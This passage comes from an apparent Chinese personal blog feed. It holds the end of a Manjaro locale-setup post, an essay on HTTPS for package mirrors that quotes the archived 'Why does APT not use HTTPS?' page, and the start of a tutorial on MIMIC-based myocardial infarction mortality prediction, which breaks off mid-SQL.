<p>最简单的做法是把系统装的语言包卸载了，只装中文字体包,见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xvY2FsaXphdGlvbl8oJUU3JUFFJTgwJUU0JUJEJTkzJUU0JUI4JUFEJUU2JTk2JTg3KS9TaW1wbGlmaWVkX0NoaW5lc2VfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Localization<i class="fa fa-external-link-alt"></i></span>。</p>
<p>或者在<code>\etc\locale.conf</code>加上<code>LANG=zh_CN.UTF-8</code></p>
<p>然后刷新字体缓存。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fc-cache -fv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>https://wiki.archlinux.org/index.php/AUR_helpers<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>https://github.com/Jguer/yay<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>https://aur.archlinux.org/packages/v2raya<a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>https://wiki.archlinux.org/index.php/Dell_Inspiron_15_(7590)<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>https://github.com/Dreamacro/clash/wiki/Breaking-Changes-in-1.0.0<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS二三事</title>
    <url>/https-in-some-specific-scene/</url>
    <content><![CDATA[<p>未完待续 <a id="more"></a></p>
<p>诸如<code>git clone</code> 、 <code>apt/yum/pacman</code>下载公开文件，到底有没有必要用HTTPS(或者SSH之类的其他加密方式)？一些不传输帐号密码之类的隐私的不怎么改变网页内容的静态网站有必要吗？</p>
<p>以前我也觉得没有必要，结果就被险恶的世道教做人了。 差不多可以盖棺定论了，如果处于运营商和防火墙的慈祥关爱中，有必要，那可太有必要了。</p>
<p>咋说，本来HTTPS是拿来给你们防范FBI、CIA、黑皮、灰产人士、高雅人士针对某个、某些特定目标搞中间人攻击偷你密码、篡改你获取的数据啥的。这种用途下载公开的包、镜像、一些仓库里的代码倒是没必要上HTTPS，普通人下个安装包也没啥东西值得攻击的，而且连到服务器下一个体积不太小的压缩包/二进制文件也不太好掺砂子，而且下完了之后还有GPG校验，传输的时候多套一个HTTPS大部分时候。而且HTTPS两边都有带宽、加解密之类的成本损耗，下载大文件是不太划算的。</p>
<p>可能他们也妹想到某些运营商和防火墙能这么流氓，直接公然大范围污染。</p>
<h2 id="目前使用https的一些小牺牲">目前使用HTTPS的一些小牺牲</h2>
<h3 id="成本">成本</h3>
<p>一般来说：</p>
<p>需要证书，证书要给签发机构交钱<br />
延迟相比HTTP略高，不过TLS1.3之后 加密解密吃资源</p>
<p>上面那些在今天看来问题都不是特别大，现在有很多 Let's Encrypt 之类的免费的（收费的CA证书也比十年前便宜太多了），现在的CPU性能对于看网页肯定是过剩的，延迟在TLS1.3以后也不是太大问题</p>
<h3 id="有些工具没有https支持">有些工具没有HTTPS支持</h3>
<p>比如OpenWRT那个官方固件一开始就没有HTTPS支持，你得自己装一个。</p>
<h3 id="很多老网站对https的支持也不太好">很多老网站对HTTPS的支持也不太好</h3>
<p>用了 HTTPS Everywhere 插件之后经常会发现很多网站体验极差，强制HTTPS之后各种资源加载不出来（关键是很多时候你还意识不到）</p>
<p><img src="/https-in-some-specific-scene/1606701614.png" /> 比如你电的图书馆，如果用的是HTTPS， 那你的图书位置看不到了（我来这找书最重要的就是这个东西，结果你不告诉我几楼）</p>
<p><img src="/https-in-some-specific-scene/1606702010.png" /></p>
<p>这个问题自从17年就有了，一直到现在，都还没修，全站HTTPs遥遥无期。 当然这个问题是因为HTTPS和HTTP的混合 会被新版chrome浏览器悄无声息地拦截，在console里才能看到一个</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Mixed Content: The page at &#39;&lt;URL&gt;&#39; was loaded over HTTPS, but requested an insecure script &#39;&lt;URL&gt;&#39;. This request has been blocked; the content must be served over HTTPS.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>你用尊贵的 <em>Internet Explorer</em> 或者老版本chrome是没有这种问题的，但是会加载漫长的几秒钟（在图书馆那个渣配的机子上甚至可能等待10秒），然后弹出来一个大大的警告框，问你<code>是否只查看安全传送的内容</code>，如果你点了<code>是</code>，恭喜你，那你看不到图书的位置了。（我这几年已经无数次看到有倒霉孩子点了是然后找不到书在什么地方了）</p>
<p>当然很多大网站也在换到HTTPS上也各种问题，知乎上个月准备全站HTTPS的时候出了好几天幺蛾子，<code>400 Bad Request The plain HTTP request was sent to HTTPS port</code>。(不过知乎这个只在乎APP，web版改版之后bug越来越多已经常态化了) <img src="/https-in-some-specific-scene/1606731950.png" /></p>
<h3 id="登陆认证页面没法劫持https">登陆认证页面没法劫持HTTPS</h3>
<p>某些登陆认证的界面的原理和劫持差不多，用的<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ2FwdGl2ZV9wb3J0YWw=">强制门户<i class="fa fa-external-link-alt"></i></span>（Captive Portal） 强制门户在自己的DNS服务器中将用户的HTTP请求302重定向到登陆页面 HTTPS没法劫持（尤其是用了HSTS的情况下），结果就卡在那里弹不出登陆认证的界面了。（其实我建议你出门在外使用流量，不要用商场的WIFI，不要贪便宜用手机验证码登陆或者微信登陆）</p>
<p>有个网站叫<span class="exturl" data-url="aHR0cDovL25ldmVyc3NsLmNvbS8=">neverssl<i class="fa fa-external-link-alt"></i></span>，当你弹不出WIFI登录界面的时候可以访问一下。（其实你随便输入一个什么）</p>
<p>一般浏览器会有相应的机制，比如火狐的 detect portal， 会向 <span class="exturl" data-url="aHR0cDovL2RldGVjdHBvcnRhbC5maXJlZm94LmNvbQ==">http://detectportal.firefox.com<i class="fa fa-external-link-alt"></i></span> 周期性的发包。</p>
<p>有的时候登陆认证门户不认200状态码,得用204，然后302跳转到登陆界面。 （提供204状态码的网站很多了，比如<span class="exturl" data-url="aHR0cHM6Ly93d3cudjJleC5jb20vdC8zMDM4ODk/cD0x">v站的这个<i class="fa fa-external-link-alt"></i></span>，基本都是给安卓用的，原生安卓会试图访问谷歌提供的204状态码的服务器来判断是否联网成功，）</p>
<h3 id="ca证书">CA证书</h3>
<p>CA证书颁发商公然耍流氓你有什么办法 https://www.zhihu.com/question/50298017 https://www.zhihu.com/question/22795329</p>
<p>CNNIC</p>
<p>HSTS MITM SSLStrip HTTP+Strict+Transport+Security HTTPSStrip https://blog.cuiyongjian.com/safe/https-attack/ https://www.zhihu.com/question/22779469</p>
<h2 id="apt下载更新是否使用https的争议">apt下载更新是否使用HTTPS的争议</h2>
<figure>
<img src="/https-in-some-specific-scene/image-20201127170614232.png" alt="image-20201127170614232" /><figcaption aria-hidden="true">image-20201127170614232</figcaption>
</figure>
<p>之前有一个叫的网站上的一篇文章叫，引起了不少的讨论。大概的观点是HTTPS在下载这种公共资源的时候没有必要啊。</p>
<p><strong>而现在，这个网站已经变成体育博彩网站了，造化弄人啊。</strong></p>
<p>理由主要有：</p>
<ol type="1">
<li><p>因为你有GPG校验，HTTPS显得没有什么太大必要。你下下来用GPG校验一下就行了，就算你用HTTPS下载，也只能保证传输过程中没有被篡改，。</p></li>
<li><p>匿名和隐私的问题：你连上镜像站，那明显是在下镜像源的包。即使你用了HTTPS，还是能通过你下载的包的大小知道你下了些啥（就算你用<code>apt-transport-tor</code>也有这个问题）。</p></li>
<li><p>还有一个重放攻击（Replay Attacks）的问题，可能有人将包替换为没有安全更新的老版本（签名校验能通过）。</p>
<p>由于apt有自己的时间戳，晚于这个时间的都被认为非法，时间戳在一段时间内自动失效</p></li>
</ol>
<h3 id="现在再看">现在再看</h3>
<p>当时我还是觉得这个写的有点道理，不到一年就被 cqu mirrors 的事情啪啪打脸。</p>
<p>当然这个作者显然没考虑CQU Mirrors事件之类的情况。</p>
<h2 id="重庆大学镜像源被搞">重庆大学镜像源被搞</h2>
<p>这个事件一出基本可以终结大部分争议了（至少国内是这样的）</p>
<p>几周前他们那边学校网管的防火墙拦截了80端口的部分HTTP请求，比如一些翻墙工具的包。如果你HTTP明文访问80端口，你会被直接RST。后来在与网管的交涉下恢复了。</p>
<h2 id="github用ssh还是https">github用SSH还是HTTPS</h2>
<p>按说SSH这种TCP+SSL的协议会比HTTPS这种跑在应用层的快不少。然而在天朝SSH挺容易被运营商Qos的， HTTPS可以薅cloudflare之类的CDN的羊毛搭github反代。给HTTPS挂socks5/HTTP代理也方便。</p>
<h2 id="dns-over-https">DNS over HTTPS</h2>
<p>众所周知传统的DNS是裸UDP的，后来由于 有了使用TCP的DNS，后来出于隐私的考虑又有了DoH（DNS over HTTPS）和DoT（DNS over TLS） 那为什么不用DoT呢？DoT那个853端口太显眼了，分分钟被运营商搞。 DoH最大的问题是慢，如果直接使用远程的DoH，查询发过去和发回来都走HTTPS。在国内用cloudflare的DoH体验极差，如果想用最好自己搭一个。 另一个问题是不支持ECS</p>
<p>其实DoH在国内也不太推荐，主要是对速度影响太大了。有的方案是走分流，国内IP用国内的DNS，国外的走DoH或者在v2ray之类的跳板上用远程DNS 而且保护隐私方面也不太能</p>
<p>另，前几天360推出了收费浏览器，居然还有什么国密DoH，号称保护隐私。周红衣说是那就是吧。</p>
<h2 id="苹果的ocsp">苹果的OCSP</h2>
<h2 id="闲谈">闲谈</h2>
<p>HTTPS这种保护隐私的东西按说很多大公司推进起来都很不积极的。但是靠着隐私和广告挣钱的谷歌和百度推起HTTPs来相当的积极，还一口一个在意用户隐私。 谷歌当年大力推广HTTPS的时候还立着<em>不作恶</em>的牌坊，2010年的你说它在乎用户隐私，姑且信了。 谷歌为了推HTTPS，直接抬高HTTPS网站相对于HTTP网站的SEO搜索权重。</p>
<p>百度也是国内最早一批全站HTTPS的，，当然能说出来“你要隐私干什么”百度显然不会这么好心，嗯，<strong>运营商猛于虎也</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI4Mzc5MDg4">如何看待百度全站搜索进入 HTTPS 时代？<i class="fa fa-external-link-alt"></i></span></p>
<figure>
<img src="/https-in-some-specific-scene/image-20201127202536977.png" alt="image-20201127202536977" /><figcaption aria-hidden="true">image-20201127202536977</figcaption>
</figure>
<p>百度运维团队当时发布的系列文章还不错，然而</p>
<p><img src="/https-in-some-specific-scene/1606707060.png" /></p>
<p>你用百度搜他们的文章，第一条第二条是CSDN和简书的抄袭转载，第三条是他们的，然而500挂掉了。这是怎么回事呢，对于这么好的文章没有被百家号抄袭，小编也很感到惊讶呢。</p>
<h2 id="参考和链接">参考和链接</h2>
<p>https://breakthrough.blog/broadcast/31929</p>
<p>https://v2ex.com/t/725979</p>
<p>https://www.solidot.org/story?sid=66084</p>
<p>很早就有了https://www.v2ex.com/t/622672?p=1</p>
<p>https://sneak.berlin/i18n/2020-11-12-your-computer-isnt-yours.zh/</p>
<p>https://blog.jacopo.io/en/post/apple-ocsp/</p>
<p>https://twitter.com/quakewang/status/1327880394801176576</p>
<p>https://www.reddit.com/r/linux/comments/aidxwa/why_does_apt_not_use_https/ https://blog.cuiyongjian.com/engineering/git-https-ssh/<br />
https://stackoverflow.com/questions/11041729/why-does-github-recommend-https-over-ssh<br />
https://news.ycombinator.com/item?id=18958679&amp;p=2 https://askubuntu.com/questions/146108/how-to-use-https-with-apt-get https://unix.stackexchange.com/questions/90227/why-there-is-no-https-transport-for-debian-apt-tool</p>
<p>https://web.archive.org/web/20180125154639/https://whydoesaptnotusehttps.com/ why does apt not use https的存档</p>
<p>https://wiki.debian.org/SecureApt</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5tb3NlcndhcmUuY29tLzIwMDkvMDYvZmlyc3QtZmV3LW1pbGxpc2Vjb25kcy1vZi1odHRwcy5odG1s">The First Few Milliseconds of an HTTPS Connection<i class="fa fa-external-link-alt"></i></span></p>
<p>https://github.com/xirong/my-web/blob/master/readme.md</p>
<p>https://cloud.tencent.com/developer/article/1399863 APT 为什么不使用 HTTPS 协议？</p>
<h2 id="附">附</h2>
<h3 id="cqu-mirrors事件官方的完整说明">CQU Mirrors事件官方的完整说明</h3>
<p>这里放一下CQU电报新闻的官方声明，地址：https://t.me/cqumirror</p>
<blockquote>
<p>2020.11.7</p>
<p>#warnings 因学校防火墙过滤规则禁止明文访问部分文件，请使用 https 方式访问镜像站</p>
<p>请暂时更换到其他镜像站。校信息中心进行防火墙维护及站群升级，目前镜像站处于完全不可用状态。恳请谅解。</p>
<p>2020.11.8</p>
<p>请务必使用https协议！目前使用http协议获取部分文件将被网络中心防火墙拦截并封禁 IP 约5分钟（初次访问）！目前无任何解决方法，我们仍在积极与校方沟通看是否能够放行。</p>
<p>2020.11.9</p>
<p>由于网络中心系统升级和维护，外部流量对于内部服务的访问将被拦截。目前未能知晓何时恢复。如急需使用镜像服务请更换至其他镜像服务器。对所造成的不便恳请谅解。</p>
<p>2020.11.11</p>
<p>已确认 IDC 正常开放外网流量访问。镜像服务恢复正常。但仍请不要明文访问数据库文件。目测防火墙策略已经调整但并未有明确证据表明限制放宽。请使用 HTTPS 协议访问镜像。</p>
<p>2020.11.18</p>
<p>经沟通目前 IDC 不再拦截明文入站请求。http 协议访问恢复</p>
</blockquote>
<p>而且cqu国庆的时候也习惯性闭关锁校，<del>跟你电完全一致</del>（不是，全国高校的网管怎么都一个样啊）</p>
<blockquote>
<p>由于不可抗力，国庆期间重庆大学多个对外服务将无法从外部访问。镜像站服务亦受到牵连。恢复对外服务时间未知。对于所造成的不便我们深感遗憾。</p>
</blockquote>
<h3 id="为什么apt不使用https的原文">为什么apt不使用HTTPS的原文</h3>
<p>这个网站已经变成在线发排的体育博彩网站了。这里附上原文</p>
<blockquote>
<h1 id="why-does-apt-not-use-https">Why does APT not use HTTPS?</h1>
<p><em>"Isn't it more secure…?"</em></p>
<h2 id="tldr">tl;dr</h2>
<p>HTTPS is used to prevent intruders from being able to listen to communications between you and websites you visit, as well as to avoid data being modified without your knowledge.</p>
<p>However, files obtained by APT are accompanied by their own signature which allows your system to check they originated from your distribution.</p>
<p>These signatures are checked against a small set of trusted keys already stored on your computer. Downloaded files are rejected by APT if they are signed by an unknown key<span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vd2h5ZG9lc2FwdG5vdHVzZWh0dHBzLmNvbS8jZm9vdG5vdGUtYXB0LXVua293bi1rZXk=">1<i class="fa fa-external-link-alt"></i></span> or are missing valid signatures. This ensures that the packages you are installing were authorised by your distribution and have not been modified or replaced since.</p>
<p>HTTPS can not detect if malicious tampering has occurred on the disks of the server you are downloading from. There is little point "securely" transfering a compromised package.</p>
<h2 id="but-what-about-privacy">But what about privacy?</h2>
<p>HTTPS does not provide meaningful privacy for obtaining packages. As an eavesdropper can usually see which hosts you are contacting, if you connect to your distribution's mirror network it would be fairly obvious that you are downloading updates.</p>
<p>Furthermore, even over an encrypted connection it is not difficult to figure out which files you are downloading based on the size of the transfer<span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vd2h5ZG9lc2FwdG5vdHVzZWh0dHBzLmNvbS8jZm9vdG5vdGUtdG9y">2<i class="fa fa-external-link-alt"></i></span>. HTTPS would therefore only be useful for downloading from a server that also offers other packages of similar or identical size.</p>
<p>What's more important is <em>not</em> that your connection is encrypted but that the files you are installing haven't been modified.</p>
<h2 id="overly-trusting-cas">Overly trusting CAs</h2>
<p>There are over 400 "Certificate Authorities" who may issue certificates for any domain. Many have poor security records and some are even explicitly controlled by governments<span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vd2h5ZG9lc2FwdG5vdHVzZWh0dHBzLmNvbS8jZm9vdG5vdGUtY2E=">3<i class="fa fa-external-link-alt"></i></span>.</p>
<p>This means that HTTPS provides little-to-no protection against a targeted attack on your distribution's mirror network. You could limit the set of valid certificates that APT would accept, but that would be be error-prone and unlikely worth the additional hassle over the existing public-key scheme.</p>
<h2 id="why-not-provide-https-anyway">Why not provide HTTPS anyway?</h2>
<p>Your distribution could cryptographically sign the files using the existing scheme and additionally serve the files over HTTPS to provide "defense in depth."</p>
<p>However, providing a huge worldwide mirror network available over SSL is not only a complicated engineering task (requiring the secure exchange and storage of private keys), it implies a misleading level of security and privacy to end-users as described above.</p>
<p>A switch to HTTPS would also mean you could not take advantage of local proxy servers for speeding up access and would additionally prohibit many kinds of peer-to-peer mirroring where files are stored on servers not controlled directly by your distribution. This would disproportionately affect users in remote locales.</p>
<h2 id="ah-what-about-replay-attacks">Ah, what about replay attacks?</h2>
<p>One issue with a naïve signing mechanism is that it does not guarantee that you are seeing the most up-to-date version of the archive.</p>
<p>This can lead to a <em>replay attack</em> where an attacker substitutes an archive with an earlier—unmodified—version of the archive. This would prevent APT from noticing new security updates which they could then exploit.</p>
<p>To mitigate this problem, APT archives includes a timestamp after which all the files are considered stale<span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vd2h5ZG9lc2FwdG5vdHVzZWh0dHBzLmNvbS8jZm9vdG5vdGUtdmFsaWQtdW50aWw=">4<i class="fa fa-external-link-alt"></i></span>.</p>
<h2 id="where-can-i-find-out-more">Where can I find out more?</h2>
<p>More technical details may be found on the <em><span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vd2lraS5kZWJpYW4ub3JnL1NlY3VyZUFwdA==">SecureAPT<i class="fa fa-external-link-alt"></i></span></em> wiki page.</p>
<h3 id="footnotes">Footnotes</h3>
<ol type="1">
<li>This appears as <code>Release: The following signatures couldn't be verified because the public key is not available</code>.</li>
<li>This may even be the case if using Tor via (for example) <span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vcmV0b3V0LmNvLnVrL2Jsb2cvMjAxNC8wNy8yMS9hcHQtdHJhbnNwb3J0LXRvcg==">apt-transport-tor<i class="fa fa-external-link-alt"></i></span>.</li>
<li>See, for example, <em><span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vc2VjdXJpdHkuc3RhY2tleGNoYW5nZS5jb20vcXVlc3Rpb25zLzUzMTE3L3doYXQtdHJ1c3RlZC1yb290LWNlcnRpZmljYXRpb24tYXV0aG9yaXRpZXMtc2hvdWxkLWktdHJ1c3Q=">What trusted root certification authorities should I trust?<i class="fa fa-external-link-alt"></i></span></em> on StackOverflow.</li>
<li>See the <em><span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTgwMTI1MTU0NjM5L2h0dHBzOi8vd2lraS5kZWJpYW4ub3JnL0RlYmlhblJlcG9zaXRvcnkvRm9ybWF0I0RhdGUuMkNfVmFsaWQtVW50aWw=">Date, Valid-Until<i class="fa fa-external-link-alt"></i></span></em> section of the <code>DebianRepository</code> page on the Debian Wiki.</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>用疾病记录预测患者死亡风险</title>
    <url>/morality-prediction/</url>
    <content><![CDATA[<p>以急性心肌梗死和MIMIC数据库为例</p>
<a id="more"></a>
<p>急性心肌梗死的发病率和死亡率都很高，MIMIC里面大概有5000次记录，用来构造数据集效果会比较好，这次就用MIMIC数据库里面的急性心肌梗死进行死亡风险的预测。</p>
<p>早期心血管疾病采用TIMI（the Thrombolysis in Myocardial Infarction）风险评分、全球急性心脏事件注册表（GRACE）评分或医生经验判断。后来MIMIC、eICU等开放医学数据库的建立和公布，数据量足够支撑起机器学习，疾病风险预测逐渐开始采用机器学习等方法。 数据清洗和构造数据集</p>
<p>目前开源的ICU重症数据库主要有MIMIC和eICU；eICU里面的患者数量多一点，但是貌似数据缺失很多，数据质量也不太好（eICU整合了几家不同医院的临床记录拼凑出来的数据库，数据质量参差不齐）</p>
<p>这里我用的MIMIC-Ⅲ数据库，内有近四万名成年人以及七千多名新生儿的五万余次住院资料，其中急性心肌梗死入院记录大概5000多次。</p>
<h2 id="更新">更新</h2>
<p>前一阵MIT发布了 MIMIC IV 数据库（第四版），MIMIC-IV目前是0.4版本，以后要放出1.0正式版。希望大家下载最新版本进行训练<del>炼丹</del></p>
<p>0.4版的压缩包有6.7G,要获取需要在网站注册帐号并进行考试答题，然后同意他们关于医学伦理的条款 下载地址： <span class="exturl" data-url="aHR0cHM6Ly9waHlzaW9uZXQub3JnL2NvbnRlbnQvbWltaWNpdi8wLjQv">https://physionet.org/content/mimiciv/0.4/<i class="fa fa-external-link-alt"></i></span> 并没有BT种子之类下载方式，下载需要帐号验证，由于版权和隐私等原因，应该也不能进行二次分发 所以大家自己去下吧。</p>
<p>通过考试答题后就直接点下载链接就好了。 官网还提供了wget的下载方式，安装包有点大，我们打开bbr下载会快一点（有美国代理记得挂）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> sysctl net.ipv4.tcp_congestion_control<span class="token operator">=</span>bbr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后填你的用户名和密码就好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r -N -c -np --user username --ask-password https://physionet.org/files/mimiciv/0.4/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下载好建库的时候记得建索引，不然后续操作会很慢</p>
<h2 id="患者筛选">患者筛选</h2>
<p>在MIMIC数据库中提取ICD-9疾病编号为410大类、疾病名称为 acute myocardial infarction的相关病人全部住院记录。数据表DIAGNOSE_ICD中的ICD9_CODE字段记录了患者的ICD-9编码，其中410大类编码根据发病部位被分为10个小类，例如第1个小类代表发病部位为前外侧壁、第2个小类代表发病部位为下外侧壁；这10 个小类又根据发病时期分为3个小类，0代表未细分，1代表初次入院，2代表再入院；例如，MIMIC数据库中ICD9_CODE字段为41031，对应的ICD-9编码为410.3.1，其中410代表急性心肌梗死，3代表下后壁，1代表初次入院。 <img src="%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E6%B5%81%E7%A8%8B.svg" alt="数据提取示意图" /></p>
<p>提取到的除后续照顾类别以外的410大类患者数据中，共有5087次入院记录，去除同一患者重复的入院记录，共有4788名病人患有急性心肌梗死（包括同时患有急性心肌梗死的并发症），其中有727人死亡，总死亡率15.18%。男性患者共2924名，平均年龄为67.2岁，死亡391人，男性死亡率13.37%；女性患者共1864名，平均年龄为73.4岁，死亡337人,女性死亡率18.10%。统计急性心肌梗死患者人群种族信息，可以发现亚裔只有74次入院记录。 特征选取</p>
<p>MIIMC里面能用的特征大概有性别年龄这些个人信息、心率血压这些生理指标、还有些用药记录之类的，为了预测患者初次发病的死亡率，只采用患者初次入院24小时内的记录检查项目作为预测指标</p>
<p>先把24小时ICUSTAY_ID选出来</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> k_AMI2 <span class="token keyword">AS</span>
<span class="token keyword">SELECT</span>
	ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>HADM_ID<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>DEATHTIME
<span class="token keyword">FROM</span>
	ADMISSIONS<span class="token punctuation">,</span>
	<span class="token punctuation">(</span>
		<span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>
			A<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
			<span class="token function">MAX</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">)</span> ADMITTIME
		<span class="token keyword">FROM</span>
			ADMISSIONS A<span class="token punctuation">,</span>
			DIAGNOSES_ICD B
		<span class="token keyword">WHERE</span>
			A<span class="token punctuation">.</span>HADM_ID <span class="token operator">=</span> B<span class="token punctuation">.</span>HADM_ID
		<span class="token operator">AND</span> <span class="token punctuation">(</span>
			ICD9_CODE <span class="token operator">=</span> <span class="token string">"41000"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41001"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41010"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41011"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41020"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41021"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41030"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41031"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41040"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41041"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41050"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41051"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41060"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41061"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41070"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41081"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41090"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41091"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41002"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41012"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41022"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41032"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41042"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41052"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41062"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41072"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41082"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41092"</span>
		<span class="token punctuation">)</span>
		<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>
			A<span class="token punctuation">.</span>SUBJECT_ID
	<span class="token punctuation">)</span> <span class="token keyword">AS</span> T
<span class="token keyword">WHERE</span>
	ADMISSIONS<span class="token punctuation">.</span>ADMITTIME <span class="token operator">=</span> T<span class="token punctuation">.</span>ADMITTIME
<span class="token operator">AND</span> ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后用找患者检查项目、生理指标的ITEM_ID。写一个简单的SQL联接查询就可以了：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>
	SUBJECT_ID<span class="token punctuation">,</span>
	<span class="token function">MAX</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MAX_VALUE<span class="token punctuation">,</span>
	<span class="token function">MIN</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MIN_VALUE
<span class="token keyword">FROM</span>
	<span class="token punctuation">(</span>
	<span class="token keyword">SELECT</span>
		CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME<span class="token punctuation">,</span>
